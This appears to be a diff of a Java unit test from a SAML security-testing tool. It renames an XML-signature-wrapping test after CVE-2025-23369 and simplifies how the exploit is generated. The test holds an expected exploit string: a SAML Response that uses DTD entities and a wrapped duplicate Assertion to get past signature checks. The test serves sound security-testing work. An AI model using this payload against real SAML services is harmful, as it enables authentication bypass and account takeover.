@@ -5,10 +5,10 @@ import org.w3c.dom.Document;
 
 import static org.junit.jupiter.api.Assertions.assertEquals;
 
-public class Xsw10Test {
+public class CVE_2025_23369_Test {
 
     @Test
-    void testXSW10() throws Exception {
+    void testCVE_2025_23369() throws Exception {
         String originalAssertion =
                 "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" +
                         "<Response ID=\"_original_response_ID\">" +
@@ -29,13 +29,7 @@ public class Xsw10Test {
                 "]>\n" +
                 "<Response ID=\"&idViaEntity;\"><Issuer>SomeIssuer</Issuer><Signature><SignedInfo><Reference URI=\"#_original_assertion_ID\"/></SignedInfo><Object xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><Assertion ID=\"&BypassIDUniqueness;_original_assertion_ID\"><Signature><SignedInfo><Reference URI=\"#_original_assertion_ID\"/></SignedInfo></Signature><NameID>OriginalName</NameID></Assertion></Object></Signature><Assertion ID=\"_original_assertion_IDffff\"><NameID>OriginalName</NameID></Assertion></Response>";
 
-        XMLHelpers xmlHelpers = new XMLHelpers();
-        XSWHelpers xswHelpers = new XSWHelpers();
-
-        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(originalAssertion);
-        xswHelpers.applyXSW("XSW10", document);
-        String after = xmlHelpers.getString(document);
-        String exploit = xswHelpers.applyDOCTYPE(after);
+        var exploit = CVE_2025_23369.apply(originalAssertion);
         assertEquals(exploitAssertion, exploit);
     }
 }
